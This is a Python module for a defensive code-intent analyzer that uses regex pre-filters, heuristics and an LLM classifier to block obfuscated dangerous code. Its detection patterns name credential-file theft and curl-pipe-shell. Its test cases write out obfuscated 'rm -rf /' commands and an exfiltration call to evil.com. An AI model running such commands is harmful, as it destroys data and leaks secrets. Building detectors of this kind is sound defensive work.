"""
Intent Analysis - Shadow LLM for Code Intent Detection

This module uses a lightweight LLM to analyze the intent of code/actions
before execution, detecting obfuscated bypass attempts that keyword
matching would miss.

Examples of bypasses this detects:
- `os.system(chr(114)+chr(109))` → intent: file_delete (rm)
- `__import__('subprocess').call(['rm','-rf','/'])` → intent: file_delete
- Base64/hex encoded commands
- Obfuscated function calls

Copyright (c) 2025 David Cooper
All rights reserved.
PATENT PENDING (Application #63/940,202)
"""

import os
import re
import json
import base64
import logging
import hashlib
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from abc import ABC, abstractmethod

logger = logging.getLogger(__name__)


# =============================================================================
# INTENT CATEGORIES
# =============================================================================

class IntentCategory(Enum):
    """Categories of detected intent"""
    BENIGN = "benign"
    FILE_READ = "file_read"
    FILE_WRITE = "file_write"
    FILE_DELETE = "file_delete"
    NETWORK_REQUEST = "network_request"
    DATA_EXFIL = "data_exfil"
    SHELL_EXEC = "shell_exec"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    CODE_INJECTION = "code_injection"
    CRYPTO_OPERATION = "crypto_operation"
    SYSTEM_MODIFICATION = "system_modification"
    UNKNOWN = "unknown"


# Risk levels for each intent
INTENT_RISK_LEVELS = {
    IntentCategory.BENIGN: 0,
    IntentCategory.FILE_READ: 20,
    IntentCategory.FILE_WRITE: 40,
    IntentCategory.FILE_DELETE: 90,
    IntentCategory.NETWORK_REQUEST: 30,
    IntentCategory.DATA_EXFIL: 95,
    IntentCategory.SHELL_EXEC: 80,
    IntentCategory.PRIVILEGE_ESCALATION: 100,
    IntentCategory.CODE_INJECTION: 100,
    IntentCategory.CRYPTO_OPERATION: 50,
    IntentCategory.SYSTEM_MODIFICATION: 85,
    IntentCategory.UNKNOWN: 60,
}


@dataclass
class IntentAnalysis:
    """Result of intent analysis"""
    intent: IntentCategory
    confidence: float  # 0-1
    risk_score: int    # 0-100
    reason: str
    details: Dict[str, Any] = field(default_factory=dict)
    blocked: bool = False
    analysis_time_ms: float = 0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "intent": self.intent.value,
            "confidence": self.confidence,
            "risk_score": self.risk_score,
            "reason": self.reason,
            "details": self.details,
            "blocked": self.blocked,
            "analysis_time_ms": self.analysis_time_ms
        }


# =============================================================================
# PATTERN-BASED PRE-FILTER
# =============================================================================

class PatternPreFilter:
    """
    Fast pattern-based pre-filter to catch obvious bypasses
    before expensive LLM analysis.
    """
    
    # Patterns that indicate obfuscation attempts
    OBFUSCATION_PATTERNS = [
        # chr() encoding
        (r'chr\s*\(\s*\d+\s*\)\s*\+', 'chr_encoding'),
        # hex encoding
        (r'\\x[0-9a-fA-F]{2}', 'hex_encoding'),
        # base64 patterns
        (r'base64\.(b64decode|decodebytes)', 'base64_decode'),
        # eval/exec
        (r'\b(eval|exec|compile)\s*\(', 'dynamic_execution'),
        # __import__
        (r'__import__\s*\(', 'dynamic_import'),
        # getattr tricks
        (r'getattr\s*\([^)]+,[^)]+\)\s*\(', 'getattr_call'),
        # bytes decode
        (r'\.decode\s*\(\s*[\'"]', 'bytes_decode'),
        # lambda obfuscation
        (r'\(lambda\s+\w+\s*:', 'lambda_obfuscation'),
    ]
    
    # High-risk command patterns
    DANGEROUS_COMMANDS = [
        (r'\brm\s+-rf\b', 'rm_rf_command'),
        (r'\bsudo\b', 'sudo_usage'),
        (r'\bchmod\s+777\b', 'chmod_777'),
        (r'\bcurl\s+.+\|\s*(sh|bash)\b', 'curl_pipe_shell'),
        (r'\bwget\s+.+\|\s*(sh|bash)\b', 'wget_pipe_shell'),
        (r'/etc/passwd', 'etc_passwd_access'),
        (r'/etc/shadow', 'etc_shadow_access'),
        (r'\.ssh/', 'ssh_directory'),
        (r'\.aws/', 'aws_credentials'),
        (r'\.env\b', 'env_file'),
    ]
    
    def analyze(self, code: str) -> Tuple[bool, List[str], int]:
        """
        Pre-filter code for obvious bypass attempts.
        
        Returns:
            (is_suspicious, patterns_matched, risk_score)
        """
        patterns_found = []
        risk = 0
        
        # Check obfuscation patterns
        for pattern, name in self.OBFUSCATION_PATTERNS:
            if re.search(pattern, code):
                patterns_found.append(f"obfuscation:{name}")
                risk += 30
        
        # Check dangerous commands
        for pattern, name in self.DANGEROUS_COMMANDS:
            if re.search(pattern, code, re.IGNORECASE):
                patterns_found.append(f"dangerous:{name}")
                risk += 50
        
        # Check for encoded content
        encoded = self._detect_encoding(code)
        if encoded:
            patterns_found.extend(encoded)
            risk += 40
        
        return len(patterns_found) > 0, patterns_found, min(100, risk)
    
    def _detect_encoding(self, code: str) -> List[str]:
        """Detect potentially encoded content"""
        findings = []
        
        # Long hex strings
        hex_strings = re.findall(r'[0-9a-fA-F]{20,}', code)
        if hex_strings:
            findings.append("long_hex_string")
        
        # Base64-like strings
        b64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
        b64_strings = re.findall(b64_pattern, code)
        for s in b64_strings:
            try:
                decoded = base64.b64decode(s).decode('utf-8', errors='ignore')
                if any(c in decoded for c in ['rm', 'curl', 'wget', 'sudo']):
                    findings.append(f"encoded_command:{decoded[:30]}")
            except Exception:
                pass
        
        return findings


# =============================================================================
# LLM ANALYZER INTERFACE
# =============================================================================

class LLMAnalyzer(ABC):
    """Abstract interface for LLM-based intent analysis"""
    
    @abstractmethod
    def analyze_intent(self, code: str) -> IntentAnalysis:
        """Analyze intent of code using LLM"""
        pass


# =============================================================================
# OPENAI ANALYZER
# =============================================================================

class OpenAIAnalyzer(LLMAnalyzer):
    """
    Intent analyzer using OpenAI's GPT models.
    
    Uses gpt-4o-mini for fast, cheap analysis (~$0.001/request).
    """
    
    SYSTEM_PROMPT = """You are a security analyzer detecting the intent of code.
Classify the code's PRIMARY intent into ONE of these categories:

- benign: Safe operation, no security concern
- file_read: Reading files from disk
- file_write: Writing/creating files
- file_delete: Deleting files or directories
- network_request: Making HTTP/network requests
- data_exfil: Sending data to external servers (data exfiltration)
- shell_exec: Executing shell commands
- privilege_escalation: Attempting to gain elevated privileges
- code_injection: Injecting or executing dynamic code
- crypto_operation: Encryption/decryption operations
- system_modification: Modifying system settings/configs
- unknown: Cannot determine intent

IMPORTANT: Detect OBFUSCATED code that tries to hide malicious intent:
- chr() encoding: chr(114)+chr(109) = "rm"
- hex encoding: \x72\x6d = "rm"  
- base64 encoding
- __import__ tricks
- eval/exec wrappers

Respond ONLY with valid JSON in this exact format:
{
    "intent": "category_name",
    "confidence": 0.95,
    "risk": 85,
    "reason": "Brief explanation of why"
}"""
    
    def __init__(
        self,
        api_key: str = None,
        model: str = "gpt-4o-mini",
        timeout: float = 5.0
    ):
        """
        Initialize OpenAI analyzer.
        
        Args:
            api_key: OpenAI API key (uses OPENAI_API_KEY env if not provided)
            model: Model to use (gpt-4o-mini recommended for cost)
            timeout: Request timeout in seconds
        """
        self.api_key = api_key or os.environ.get("OPENAI_API_KEY")
        self.model = model
        self.timeout = timeout
        
        if not self.api_key:
            logger.warning("No OpenAI API key - LLM analysis disabled")
    
    def analyze_intent(self, code: str) -> IntentAnalysis:
        """Analyze code intent using OpenAI"""
        import time
        start = time.time()
        
        if not self.api_key:
            return IntentAnalysis(
                intent=IntentCategory.UNKNOWN,
                confidence=0,
                risk_score=50,
                reason="LLM analysis disabled - no API key"
            )
        
        try:
            # Import here to avoid dependency if not using OpenAI
            from openai import OpenAI
            
            client = OpenAI(api_key=self.api_key)
            
            # Truncate very long code
            truncated = code[:2000] if len(code) > 2000 else code
            
            response = client.chat.completions.create(
                model=self.model,
                messages=[
                    {"role": "system", "content": self.SYSTEM_PROMPT},
                    {"role": "user", "content": f"Analyze this code:\n```\n{truncated}\n```"}
                ],
                max_tokens=150,
                temperature=0,
                timeout=self.timeout
            )
            
            # Parse response
            content = response.choices[0].message.content.strip()
            
            # Extract JSON from response
            json_match = re.search(r'\{[^}]+\}', content, re.DOTALL)
            if json_match:
                result = json.loads(json_match.group())
            else:
                result = json.loads(content)
            
            elapsed = (time.time() - start) * 1000
            
            intent_str = result.get("intent", "unknown")
            try:
                intent = IntentCategory(intent_str)
            except ValueError:
                intent = IntentCategory.UNKNOWN
            
            return IntentAnalysis(
                intent=intent,
                confidence=result.get("confidence", 0.5),
                risk_score=result.get("risk", INTENT_RISK_LEVELS.get(intent, 50)),
                reason=result.get("reason", "No reason provided"),
                analysis_time_ms=elapsed
            )
            
        except ImportError:
            return IntentAnalysis(
                intent=IntentCategory.UNKNOWN,
                confidence=0,
                risk_score=50,
                reason="OpenAI package not installed"
            )
        except json.JSONDecodeError as e:
            elapsed = (time.time() - start) * 1000
            return IntentAnalysis(
                intent=IntentCategory.UNKNOWN,
                confidence=0,
                risk_score=60,
                reason=f"Failed to parse LLM response: {e}",
                analysis_time_ms=elapsed
            )
        except Exception as e:
            elapsed = (time.time() - start) * 1000
            logger.error(f"LLM analysis failed: {e}")
            return IntentAnalysis(
                intent=IntentCategory.UNKNOWN,
                confidence=0,
                risk_score=60,
                reason=f"LLM error: {str(e)}",
                analysis_time_ms=elapsed
            )


# =============================================================================
# LOCAL ANALYZER (No API Required)
# =============================================================================

class LocalAnalyzer(LLMAnalyzer):
    """
    Local intent analyzer using pattern matching and heuristics.
    
    No API required - works offline. Less accurate than LLM but
    provides baseline protection.
    """
    
    # Intent detection patterns
    INTENT_PATTERNS = {
        IntentCategory.FILE_DELETE: [
            r'\bos\.remove\b', r'\bos\.unlink\b', r'\bshutil\.rmtree\b',
            r'\bPath\([^)]+\)\.unlink\b', r'\brm\s+-', r'\bdel\s+',
        ],
        IntentCategory.FILE_WRITE: [
            r'open\([^)]+[\'"]w[\'"]', r'\.write\s*\(',
            r'with\s+open\([^)]+[\'"]w', r'\bshutil\.copy\b',
        ],
        IntentCategory.FILE_READ: [
            r'open\([^)]+[\'"]r[\'"]', r'\.read\s*\(',
            r'with\s+open\([^)]+[\'"]r', r'Path\([^)]+\)\.read_',
        ],
        IntentCategory.SHELL_EXEC: [
            r'\bos\.system\b', r'\bsubprocess\.(run|call|Popen)\b',
            r'\bos\.popen\b', r'\bcommands\.getoutput\b',
        ],
        IntentCategory.NETWORK_REQUEST: [
            r'\brequests\.(get|post|put|delete)\b',
            r'\burllib\.request\b', r'\bhttpx\b', r'\baiohttp\b',
        ],
        IntentCategory.DATA_EXFIL: [
            r'requests\.post\([^)]+data=', r'\.upload\b',
            r'ftp\.stor', r'scp\s+', r'rsync\s+',
        ],
        IntentCategory.CODE_INJECTION: [
            r'\beval\s*\(', r'\bexec\s*\(', r'\bcompile\s*\(',
            r'__import__', r'importlib\.import_module',
        ],
        IntentCategory.PRIVILEGE_ESCALATION: [
            r'\bsudo\b', r'\bsu\s+-', r'\bsetuid\b',
            r'os\.setuid', r'os\.setgid',
        ],
        IntentCategory.SYSTEM_MODIFICATION: [
            r'/etc/', r'\\Windows\\System32',
            r'\bregistry\b', r'os\.environ\[',
        ],
    }
    
    def analyze_intent(self, code: str) -> IntentAnalysis:
        """Analyze code intent using local patterns"""
        import time
        start = time.time()
        
        detected_intents = []
        
        # Check each intent pattern
        for intent, patterns in self.INTENT_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, code, re.IGNORECASE):
                    detected_intents.append(intent)
                    break
        
        elapsed = (time.time() - start) * 1000
        
        if not detected_intents:
            return IntentAnalysis(
                intent=IntentCategory.BENIGN,
                confidence=0.6,
                risk_score=0,
                reason="No suspicious patterns detected",
                analysis_time_ms=elapsed
            )
        
        # Return highest risk intent
        primary = max(detected_intents, key=lambda i: INTENT_RISK_LEVELS[i])
        
        return IntentAnalysis(
            intent=primary,
            confidence=0.7,
            risk_score=INTENT_RISK_LEVELS[primary],
            reason=f"Detected {len(detected_intents)} intent patterns",
            details={"all_intents": [i.value for i in detected_intents]},
            analysis_time_ms=elapsed
        )


# =============================================================================
# INTENT ANALYZER (Main Interface)
# =============================================================================

class IntentAnalyzer:
    """
    Main intent analyzer combining pre-filter, local, and LLM analysis.
    
    Analysis flow:
    1. Pattern pre-filter (fast, catches obvious bypasses)
    2. Local analysis (no API, baseline protection)
    3. LLM analysis (accurate, catches obfuscation)
    
    Usage:
        analyzer = IntentAnalyzer()
        
        result = analyzer.analyze(code)
        if result.blocked:
            raise SecurityError(result.reason)
    """
    
    def __init__(
        self,
        use_llm: bool = True,
        openai_api_key: str = None,
        llm_model: str = "gpt-4o-mini",
        risk_threshold: int = 70,
        always_block: List[IntentCategory] = None
    ):
        """
        Initialize intent analyzer.
        
        Args:
            use_llm: Whether to use LLM analysis
            openai_api_key: OpenAI API key
            llm_model: LLM model to use
            risk_threshold: Risk score above which to block
            always_block: Intents that are always blocked
        """
        self.use_llm = use_llm
        self.risk_threshold = risk_threshold
        self.always_block = always_block or [
            IntentCategory.PRIVILEGE_ESCALATION,
            IntentCategory.CODE_INJECTION,
            IntentCategory.DATA_EXFIL,
        ]
        
        # Initialize analyzers
        self.pre_filter = PatternPreFilter()
        self.local_analyzer = LocalAnalyzer()
        
        if use_llm:
            self.llm_analyzer = OpenAIAnalyzer(
                api_key=openai_api_key,
                model=llm_model
            )
        else:
            self.llm_analyzer = None
        
        # Cache for repeated code
        self._cache: Dict[str, IntentAnalysis] = {}
        self._cache_hits = 0
        self._cache_misses = 0
        
        logger.info(f"IntentAnalyzer initialized (LLM: {use_llm})")
    
    def analyze(
        self,
        code: str,
        use_cache: bool = True,
        force_llm: bool = False
    ) -> IntentAnalysis:
        """
        Analyze code intent.
        
        Args:
            code: Code to analyze
            use_cache: Use cached results for identical code
            force_llm: Force LLM analysis even if pre-filter passes
            
        Returns:
            IntentAnalysis with results
        """
        # Check cache
        code_hash = hashlib.md5(code.encode()).hexdigest()
        if use_cache and code_hash in self._cache:
            self._cache_hits += 1
            return self._cache[code_hash]
        
        self._cache_misses += 1
        
        # Step 1: Pre-filter
        is_suspicious, patterns, prefilter_risk = self.pre_filter.analyze(code)
        
        if is_suspicious and prefilter_risk >= 80:
            # Obvious bypass attempt - block without LLM
            result = IntentAnalysis(
                intent=IntentCategory.CODE_INJECTION,
                confidence=0.9,
                risk_score=prefilter_risk,
                reason=f"Obfuscation detected: {', '.join(patterns[:3])}",
                details={"patterns": patterns},
                blocked=True
            )
            self._cache[code_hash] = result
            return result
        
        # Step 2: Local analysis
        local_result = self.local_analyzer.analyze_intent(code)
        
        # Step 3: LLM analysis (if enabled and needed)
        if self.llm_analyzer and (force_llm or is_suspicious or local_result.risk_score > 30):
            llm_result = self.llm_analyzer.analyze_intent(code)
            
            # Combine results (prefer LLM if confident)
            if llm_result.confidence > local_result.confidence:
                result = llm_result
            else:
                result = local_result
            
            # Add pre-filter findings
            if patterns:
                result.details["prefilter_patterns"] = patterns
        else:
            result = local_result
        
        # Determine if blocked
        result.blocked = (
            result.risk_score >= self.risk_threshold or
            result.intent in self.always_block
        )
        
        # Cache result
        if use_cache:
            self._cache[code_hash] = result
            # Limit cache size
            if len(self._cache) > 10000:
                # Remove oldest half
                keys = list(self._cache.keys())[:5000]
                for k in keys:
                    del self._cache[k]
        
        return result
    
    def should_block(self, code: str) -> Tuple[bool, str]:
        """
        Simple interface to check if code should be blocked.
        
        Returns:
            (should_block, reason)
        """
        result = self.analyze(code)
        return result.blocked, result.reason
    
    def get_stats(self) -> Dict[str, Any]:
        """Get analyzer statistics"""
        total = self._cache_hits + self._cache_misses
        return {
            "cache_hits": self._cache_hits,
            "cache_misses": self._cache_misses,
            "cache_hit_rate": f"{(self._cache_hits / total * 100):.1f}%" if total > 0 else "0%",
            "cache_size": len(self._cache),
            "llm_enabled": self.llm_analyzer is not None,
            "risk_threshold": self.risk_threshold,
            "always_block": [i.value for i in self.always_block]
        }


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

# Global analyzer instance
_analyzer: Optional[IntentAnalyzer] = None


def get_analyzer() -> IntentAnalyzer:
    """Get or create global analyzer instance"""
    global _analyzer
    if _analyzer is None:
        _analyzer = IntentAnalyzer()
    return _analyzer


def analyze_intent(code: str) -> IntentAnalysis:
    """Analyze code intent using global analyzer"""
    return get_analyzer().analyze(code)


def should_block_code(code: str) -> Tuple[bool, str]:
    """Check if code should be blocked"""
    return get_analyzer().should_block(code)


# =============================================================================
# EXAMPLE USAGE
# =============================================================================

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    print("\n" + "=" * 60)
    print("INTENT ANALYSIS TEST")
    print("=" * 60)
    
    # Create analyzer (local only for testing)
    analyzer = IntentAnalyzer(use_llm=False)
    
    # Test cases
    test_cases = [
        # Benign
        ("x = 1 + 2", "Simple math"),
        
        # File operations
        ("open('file.txt', 'r').read()", "File read"),
        ("os.remove('/tmp/test.txt')", "File delete"),
        
        # Obfuscation attempts
        ("os.system(chr(114)+chr(109)+' -rf /')", "chr() encoded rm"),
        ("eval(base64.b64decode('cm0gLXJmIC8='))", "Base64 encoded command"),
        ("__import__('os').system('rm -rf /')", "Dynamic import"),
        
        # Shell execution
        ("subprocess.run(['ls', '-la'])", "Shell exec"),
        
        # Network
        ("requests.post('https://evil.com', data=secrets)", "Data exfil"),
    ]
    
    print("\n[Test Cases]")
    print("-" * 60)
    
    for code, description in test_cases:
        result = analyzer.analyze(code)
        status = "🚫 BLOCKED" if result.blocked else "✅ Allowed"
        print(f"\n{description}:")
        print(f"  Code: {code[:50]}...")
        print(f"  Intent: {result.intent.value}")
        print(f"  Risk: {result.risk_score}/100")
        print(f"  {status}: {result.reason}")
    
    print("\n" + "=" * 60)
    print("STATS")
    print("=" * 60)
    stats = analyzer.get_stats()
    for key, value in stats.items():
        print(f"{key}: {value}")
